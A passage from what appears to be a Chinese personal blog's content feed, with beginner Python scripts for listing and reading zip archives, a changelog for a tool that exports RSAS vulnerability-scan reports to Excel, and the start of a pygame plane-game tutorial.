class="line">import re</span><br><span class="line"></span><br><span class="line"># 正则，获取指定文件名</span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line"># 等参，获取用户输入的目录路径</span><br><span class="line">folder_name = str(sys.argv[1])</span><br><span class="line"></span><br><span class="line"># 获取路径的所有文件名</span><br><span class="line">dirList = os.listdir(folder_name)</span><br><span class="line"></span><br><span class="line"># 遍历输出所有文件名</span><br><span class="line">for name in dirList:</span><br><span class="line">    # 只获取正则内的文件名</span><br><span class="line">    all_other = re.findall(file_re,name)</span><br><span class="line">    if all_other:</span><br><span class="line">        # 输出文件名</span><br><span class="line">        print(all_other[0])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python zipfile无需解压直接读取zip中的文件内容</title>
      <link href="/article/python-zipfile.html"/>
      <url>/article/python-zipfile.html</url>
      
        <content type="html"><![CDATA[<p>参考：<br>Python 获取目录下的指定文件名<br><a href="https://webing.io/article/computer-python-input-folder-name.html" target="_blank" rel="noopener">https://webing.io/article/computer-python-input-folder-name.html</a><br>Python zipfile无需解压直接读取zip中的文件内容<br><a href="https://webing.io/article/computer-python-zipfile.html" target="_blank" rel="noopener">https://webing.io/article/computer-python-zipfile.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line">import shutil</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line">file_name_re = &apos;(.*?).zip&apos;</span><br><span class="line">uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line">folder_name = str(sys.argv[1])</span><br><span class="line">dirList = os.listdir(folder_name)</span><br><span class="line">os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">#遍历所有文件名</span><br><span class="line">for name in os.listdir():</span><br><span class="line">    #输出zip压缩包的文件名</span><br><span class="line">    all_file_name = re.findall(file_re,name)</span><br><span class="line">    #获取文件名，创建文件夹用</span><br><span class="line">    zip_file_name = re.findall(file_name_re,name)</span><br><span class="line">    #遍历压缩包的文件名</span><br><span class="line">    for file_name in all_file_name:</span><br><span class="line">            uzip = zipfile.ZipFile(file_name)</span><br><span class="line">            #解压文件</span><br><span class="line">            uzip.extractall(&apos;temp/&apos;+zip_file_name[0])</span><br><span class="line">            uzip.close()</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/reportfiles&apos;)</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/host/media&apos;)</span><br><span class="line">            os.remove(&apos;temp/&apos;+zip_file_name[0]+&apos;/index.html&apos;)</span><br><span class="line"></span><br><span class="line">            os.chdir(&apos;temp/&apos;+zip_file_name[0]+&apos;/host&apos;)</span><br><span class="line">            # print(os.getcwd())</span><br><span class="line">            html_list = os.listdir()</span><br><span class="line">            for x in html_list:</span><br><span class="line">                # print(x)</span><br><span class="line">                content = open(x,&apos;r&apos;,encoding=&apos;utf-8&apos;)</span><br><span class="line">                htmlcont = content.read()</span><br><span class="line">                content.close()</span><br><span class="line">                print (&apos;读取文件：%s&apos;%x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            time.sleep(10)</span><br><span class="line">            os.chdir(&apos;../../../&apos;)</span><br><span class="line">            print(os.getcwd())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#操作后删除非空文件夹</span><br><span class="line"># time.sleep(3)</span><br><span class="line">print(&apos;删除缓存目录！&apos;)</span><br><span class="line">shutil.rmtree(&apos;temp&apos;)</span><br><span class="line"># print(os.getcwd())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line">import shutil</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line">file_name_re = &apos;(.*?).zip&apos;</span><br><span class="line">uzip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line">folder_name = str(sys.argv[1])</span><br><span class="line">dirList = os.listdir(folder_name)</span><br><span class="line">os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">#遍历所有文件名</span><br><span class="line">for name in os.listdir():</span><br><span class="line">    #输出zip压缩包的文件名</span><br><span class="line">    all_file_name = re.findall(file_re,name)</span><br><span class="line">    #获取文件名，创建文件夹用</span><br><span class="line">    zip_file_name = re.findall(file_name_re,name)</span><br><span class="line">    #遍历压缩包的文件名</span><br><span class="line">    for file_name in all_file_name:</span><br><span class="line">            uzip = zipfile.ZipFile(file_name)</span><br><span class="line">            #解压文件</span><br><span class="line">            uzip.extractall(&apos;temp/&apos;+zip_file_name[0])</span><br><span class="line">            uzip.close()</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/reportfiles&apos;)</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/host/media&apos;)</span><br><span class="line">            os.remove(&apos;temp/&apos;+zip_file_name[0]+&apos;/index.html&apos;)</span><br><span class="line">            </span><br><span class="line">            os.chdir(&apos;temp/&apos;+zip_file_name[0]+&apos;/host&apos;)</span><br><span class="line">            print(os.getcwd())</span><br><span class="line">            html_list = os.listdir()</span><br><span class="line">            for x in html_list:</span><br><span class="line">                print(x)</span><br><span class="line">                </span><br><span class="line">            time.sleep(10)</span><br><span class="line">            os.chdir(&apos;../../../&apos;)</span><br><span class="line">            print(os.getcwd())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#操作后删除非空文件夹</span><br><span class="line"># time.sleep(3)</span><br><span class="line"># shutil.rmtree(&apos;temp&apos;)</span><br><span class="line"># print(os.getcwd())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import zipfile</span><br><span class="line">import shutil</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">file_re = &apos;.*?.zip&apos;</span><br><span class="line">file_name_re = &apos;(.*?).zip&apos;</span><br><span class="line">folder_name = str(sys.argv[1])</span><br><span class="line">os.chdir(folder_name)</span><br><span class="line"></span><br><span class="line">#遍历所有文件名</span><br><span class="line">for name in os.listdir():</span><br><span class="line">    #输出zip压缩包的文件名</span><br><span class="line">    all_file_name = re.findall(file_re,name)</span><br><span class="line">    #获取文件名，创建文件夹用</span><br><span class="line">    zip_file_name = re.findall(file_name_re,name)</span><br><span class="line">    #遍历压缩包的文件名</span><br><span class="line">    for file_name in all_file_name:</span><br><span class="line">            uzip = zipfile.ZipFile(file_name)</span><br><span class="line">            #解压文件</span><br><span class="line">            uzip.extractall(&apos;temp/&apos;+zip_file_name[0])</span><br><span class="line">            uzip.close()</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/reportfiles&apos;)</span><br><span class="line">            shutil.rmtree(&apos;temp/&apos;+zip_file_name[0]+&apos;/host/media&apos;)</span><br><span class="line">            os.remove(&apos;temp/&apos;+zip_file_name[0]+&apos;/index.html&apos;)</span><br><span class="line">#操作后删除非空文件夹</span><br><span class="line"># time.sleep(3)</span><br><span class="line"># shutil.rmtree(&apos;temp&apos;)</span><br><span class="line">os.chdir(&apos;temp&apos;)</span><br><span class="line">print(os.getcwd())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">azip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"></span><br><span class="line">azip = zipfile.ZipFile(&apos;广西.zip&apos;)</span><br><span class="line">for x in azip.namelist():</span><br><span class="line">    all_other = re.findall(azip_re,x)</span><br><span class="line">    if all_other:</span><br><span class="line">        htmlcont = azip.open(all_other[0]).read().decode(&apos;utf8&apos;)</span><br><span class="line">        print(htmlcont)</span><br><span class="line">        htmlcont.close()</span><br><span class="line"></span><br><span class="line">print(azip.filename)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">#正则，用于zip文件内有效</span><br><span class="line">azip_re = &apos;host/\d+\W\d+\W\d+\W\d+\Whtml&apos;</span><br><span class="line"></span><br><span class="line">azip = zipfile.ZipFile(&apos;广西.zip&apos;)</span><br><span class="line">#获取压缩包内的文件名，并迭代</span><br><span class="line">for x in azip.namelist():</span><br><span class="line">    #只匹配正则内的文件名</span><br><span class="line">    all_other = re.findall(azip_re,x)</span><br><span class="line">    #判断返回的文件名是否为空</span><br><span class="line">    if all_other:</span><br><span class="line">        #读取文件内容</span><br><span class="line">        htmlcont = azip.open(all_other[0]).read().decode(&apos;utf8&apos;)</span><br><span class="line">        print(htmlcont)</span><br><span class="line">        htmlcont.close()</span><br><span class="line"></span><br><span class="line">#返回压缩包的名字</span><br><span class="line">print(azip.filename)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 绿盟远程安全评估系统(RSAS)漏洞跟踪表导出工具</title>
      <link href="/article/tool-rsas-tool.html"/>
      <url>/article/tool-rsas-tool.html</url>
      
        <content type="html"><![CDATA[<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>2019年4月3日，最后一次更新了，改不动了，一点备注都没有，这代码自己都看不懂了。</p><p>新增了自定义模板和导出的数据，不仅能满足大佬们，公司使用也是没什么问题的。</p><p>GitHub源码：</p><p><a href="https://github.com/autoing/RSAS-Data-Export" target="_blank" rel="noopener">https://github.com/autoing/RSAS-Data-Export</a></p><h3 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h3><p>绿盟远程安全评估系统漏洞数据导出工具，只支持RSAS6.0以上版本。</p><p>写这个工具的时候刚开始接触Python，采用的是先读取HTML内容写入到临时文件，再用正则从临时文件匹配。</p><p>后来发现了xpath这个新大陆，本打算重新写一下，想了想，能用就行了。</p><p>工具涉及：读取目录下的文件、ZIP文件读取、正则表达式、Excel表格写入、文件读写、PyQt5、TKinter(舍弃)</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li><input checked disabled type="checkbox"> 自定义漏洞等级</li><li><input checked disabled type="checkbox"> 自定义导出数据</li><li><input checked disabled type="checkbox"> 自定义Excel模板</li><li><input checked disabled type="checkbox"> 支持导出的数据：主机名、IP地址、端口、协议、服务、漏洞名称、风险等级、整改建议、漏洞描述、漏洞CVE编号、扫描起始时间、扫描结束时间、漏洞扫描月份</li><li><input checked disabled type="checkbox"> 导出不同端口的同一个漏洞，也就是一个端口对应一个漏洞，保证导出漏洞的完整性。</li><li><input checked disabled type="checkbox"> 导出端口和导出网站为单独的功能，导出网站的功能是采用正则去匹配http、www这两个服务。</li></ul><h3 id="须知"><a href="#须知" class="headerlink" title="须知"></a>须知</h3><ul><li><input checked disabled type="checkbox"> 当一个漏洞存在两个或者两个以上CVE编号，则只取第一个CVE漏洞编号。</li><li><input checked disabled type="checkbox"> 当一个漏洞不存在CVE编号时，则替换为 漏洞暂无CVE编号 。</li><li><input checked disabled type="checkbox"> 当一个漏洞整改建议为空时（个别低危漏洞），导出留空。</li></ul><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>下载链接是Windows版本的，如果需要在其他平台使用，可下载源码自己打包。<br>链接: <a href="https://pan.baidu.com/s/1FNwglqj7zXML76WGo4-ldw" target="_blank" rel="noopener">https://pan.baidu.com/s/1FNwglqj7zXML76WGo4-ldw</a> 提取码: jgmk</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>导出的原始报告必须勾选主机报表才行，程序是直接读取zip的，不能解压，把原始报告放到一个文件夹内，路径选择对应的文件夹就可以了。</p><p><img src="../do/images/tool/rsas_1.8.gif" alt></p><h3 id="Tkinter界面"><a href="#Tkinter界面" class="headerlink" title="Tkinter界面"></a>Tkinter界面</h3><p>下载链接：<br>已经不开放下载了，界面太丑懒得上传。</p><h3 id="工具更新"><a href="#工具更新" class="headerlink" title="工具更新"></a>工具更新</h3><h6 id="2018年8月15日"><a href="#2018年8月15日" class="headerlink" title="2018年8月15日"></a>2018年8月15日</h6><ul><li><input checked disabled type="checkbox"> 修复了一些字符问题</li><li><input checked disabled type="checkbox"> 整合了漏洞、端口、web服务导出功能</li></ul><h4 id="2018年8月12日"><a href="#2018年8月12日" class="headerlink" title="2018年8月12日"></a>2018年8月12日</h4><ul><li><input checked disabled type="checkbox"> 打算换个界面，毕竟TK太丑！</li><li><input checked disabled type="checkbox"> 整合其他功能，布局做一些小改动！</li></ul><h3 id="TKinter"><a href="#TKinter" class="headerlink" title="TKinter"></a>TKinter</h3><h4 id="2018年7月20日"><a href="#2018年7月20日" class="headerlink" title="2018年7月20日"></a>2018年7月20日</h4><ul><li><input checked disabled type="checkbox"> 修复了一个小概率下会发生的BUG，也是最终版本了。</li></ul><h4 id="2018年6月16日"><a href="#2018年6月16日" class="headerlink" title="2018年6月16日"></a>2018年6月16日</h4><ul><li><input checked disabled type="checkbox"> 新增数据筛选、漏洞统计等等。</li></ul><h4 id="2018年5月9日"><a href="#2018年5月9日" class="headerlink" title="2018年5月9日"></a>2018年5月9日</h4><ul><li><input checked disabled type="checkbox"> 工具接近尾声，解决CVE漏洞编号问题后可以保存到Excel</li><li><input disabled type="checkbox"> 待解决一、有些扫描报告很特殊，内容所在标签结构不一，导致获取内容的时候获取了很多源代码标签</li><li><input disabled type="checkbox"> 待解决二、有些低危漏洞导不出来，初步判断是CVE漏洞编号问题，解决后再次验证</li></ul><h4 id="2018年5月8日"><a href="#2018年5月8日" class="headerlink" title="2018年5月8日"></a>2018年5月8日</h4><ul><li><input checked disabled type="checkbox"> 使用系统自带的编译来提高速度，但是在引用文件步骤很繁琐</li><li><input disabled type="checkbox"> 修改多次无效，暂时放弃</li></ul><h4 id="2018年5月6日"><a href="#2018年5月6日" class="headerlink" title="2018年5月6日"></a>2018年5月6日</h4><ul><li><input checked disabled type="checkbox"> 当前流程：获取扫描报告存放目录，选出压缩包，直接读取里边的内容，再通过下边的代码来导出漏洞。</li><li><input disabled type="checkbox"> 但测试发现导出速度贼慢。</li></ul><ul><li>现在有两种解决方案：<br>一、读取压缩包内容，先保存，后处理。<br>二、解压或者复制里边的内容存放到文件夹，后处理。</li></ul><ul><li><input checked disabled type="checkbox"> 读取保存还不如复制或者解压，选方案二。</li></ul><h4 id="2018年5月5日"><a href="#2018年5月5日" class="headerlink" title="2018年5月5日"></a>2018年5月5日</h4><ul><li><input checked disabled type="checkbox"> 获取IP地址、主机名、操作系统、端口、协议、服务、漏洞名称、漏洞描述、漏洞解决方法、漏洞CVE编号。</li><li><input checked disabled type="checkbox"> 获取端口、协议、服务、漏洞名称、漏洞描述、漏洞解决方法、漏洞CVE编号。</li><li><input checked disabled type="checkbox"> 迭代输出效果可能会慢，但其实，直接写入文件的话，应该不慢。</li></ul><h4 id="2018年5月4日"><a href="#2018年5月4日" class="headerlink" title="2018年5月4日"></a>2018年5月4日</h4><ul><li><input checked disabled type="checkbox"> 代码雏形：2669K的单页，导出花时21秒，速度太慢了。</li></ul><h4 id="2018年4月26日"><a href="#2018年4月26日" class="headerlink" title="2018年4月26日"></a>2018年4月26日</h4><ul><li><input disabled type="checkbox"> 尝试按照昨天的想法去实现，都是大坑</li><li><input disabled type="checkbox"> 重构框架，想好再写</li><li><input checked disabled type="checkbox"> 只能回到原点，从昨天的代码开始。</li></ul><h4 id="2018年4月25日"><a href="#2018年4月25日" class="headerlink" title="2018年4月25日"></a>2018年4月25日</h4><ul><li><input checked disabled type="checkbox"> 先实现漏洞、端口、协议导出功能</li></ul><ul><li>计划下一步，导出下边的漏洞名称和解决办法</li><li>然后通过对比方式，添加漏洞解决方法</li></ul><ul><li><input checked disabled type="checkbox"> 从2.2 漏洞详情入手</li></ul><ul><li>想了想，发现上边的两点太蠢，而且也不会</li><li>观察发现，可以通过正则和标签来获取漏洞解决办法，以下代码要重新写</li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 打飞机</title>
      <link href="/article/python-plane.html"/>
      <url>/article/python-plane.html</url>
      
        <content type="html"><![CDATA[<h3 id="创建窗口（固定的）"><a href="#创建窗口（固定的）" class="headerlink" title="创建窗口（固定的）"></a>创建窗口（固定的）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import pygame</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 创建窗口,(480,852)为分辨率，0,32固定的解码。</span><br><span class="line">    screen = pygame.display.set_mode((480,852),0,32)</span><br><span class="line"></span><br><span class="line">    # 创建背景图片，当前目录下的plane文件夹下的背景图</span><br><span class="line">    background = pygame.image.load(&quot;./plane/background.png&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # 图片左上角对应窗口的0,0坐标</span><br><span class="line">        screen.blit(background, (0,0))</span><br><span class="line">        # 刷新</span><br><span class="line">        pygame.display.update()</span><br><span class="line"></span><br><span class="line">        time.sleep(0.01)</span><br><span class="line"></span><br><span class="line">#如果是别人再调用，这个if条件将不满足</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="创建飞机"><a href="#创建飞机" class="headerlink" title="创建飞机"></a>创建飞机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import pygame</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 创建窗口,(480,852)为分辨率，0,32固定的解码。</span><br><span class="line">    screen = pygame.display.set_mode((480,852),0,32)</span><br><span class="line"></span><br><span class="line">    # 创建背景图片，当前目录下的plane文件夹下的背景图</span><br><span class="line">    background = pygame.image.load(&quot;./plane/background.png&quot;)</span><br><span class="line"></span><br><span class="line">    # 创建一个飞机图片</span><br><span class="line">    hero = pygame.image.load(&quot;./plane/hero1.png&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        # 图片左上角对应窗口的0,0坐标</span><br><span class="line">        screen.blit(background, (0,0))</span><br><span class="line">        # 飞机的位置</span><br><span class="line">        screen.blit(hero, (205,700))</span><br><span class="line">        # 刷新</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        time.sleep(0.01)</span><br><span class="line"></span><br><span class="line">#如果是别人再调用，这个if条件将不满足</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="获取键盘信息（固定的）"><a href="#获取键盘信息（固定的）" class="headerlink" title="获取键盘信息（固定的）"></a>获取键盘信息（固定的）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import pygame</span><br><span class="line">from pygame.locals import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 创建窗口,(480,852)为分辨率，0,32固定的解码。</span><br><span class="line">    screen = pygame.display.set_mode((480,852),0,32)</span><br><span class="line"></span><br><span class="line">    # 创建背景图片，当前目录下的plane文件夹下的背景图</span><br><span class="line">    background = pygame.image.load(&quot;./plane/background.png&quot;)</span><br><span class="line"></span><br><span class="line">    # 创建一个飞机图片</span><br><span class="line">    hero = pygame.image.load(&quot;./plane/hero1.png&quot;)</span><br><span class="line"></span><br><span class="line">    x = 205</span><br><span class="line">    y = 700</span><br><span class="line">    while True:</span><br><span class="line">        # 图片左上角对应窗口的0,0坐标</span><br><span class="line">        screen.blit(background, (0,0))</span><br><span class="line">        # 飞机的位置,用变量x，y表示</span><br><span class="line">        screen.blit(hero, (x,y))</span><br><span class="line">        # 刷新</span><br><span class="line">        pygame.display.update()</span><br><span class="line">        time.sleep(0.01)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        #获取事件，比如按键等,这里的代码是固定的</span><br><span class="line">        for event in pygame.event.get():</span><br><span class="line">            #判断是否是点击了退出按钮</span><br><span class="line">            if event.type == QUIT:</span><br><span class="line">                print(&quot;exit&quot;)</span><br><span class="line">                exit()</span><br><span class="line">            #判断是否是按下了键</span><br><span class="line">            elif event.type == KEYDOWN:</span><br><span class="line">                #检测按键是否是a或者left</span><br><span class="line">                if event.key == K_a or event.key == K_LEFT:</span><br><span class="line">                    print(&apos;left&apos;)</span><br><span class="line">                    x-=5</span><br><span class="line">                #检测按键是否是d或者right</span><br><span class="line">                elif event.key == K_d or event.key == K_RIGHT:</span><br><span class="line">                    print(&apos;right&apos;)</span><br><span class="line">                    x+=5</span><br><span class="line">                #检测按键是否是空格键</span><br><span class="line">                elif event.key == K_SPACE:</span><br><span class="line">                    print(&apos;space&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#如果是别人再调用，这个if条件将不满足</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import pygame</span><br><span class="line">from pygame.locals import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class Plane(object):</span><br><span class="line">    def __init__(self, screen_temp):</span><br><span class="line">        # 定义飞机初始位置</span><br><span class="line">        self.x = 200</span><br><span class="line">        self.y = 700</span><br><span class="line">        #接收screen，并赋值</span><br><span class="line">        self.screen = screen_temp</span><br><span class="line">        #设置飞机的图片</span><br><span class="line">        self.image = pygame.image.load(&quot;./plane/hero1.png&quot;)</span><br><span class="line"></span><br><span class="line">    def display(self):</span><br><span class="line">        #显示飞机</span><br><span class="line">        self.screen.blit(self.image, (self.x, self.y))</span><br><span class="line"></span><br><span class="line">    def move_left(self):</span><br><span class="line">        self.x -= 5</span><br><span 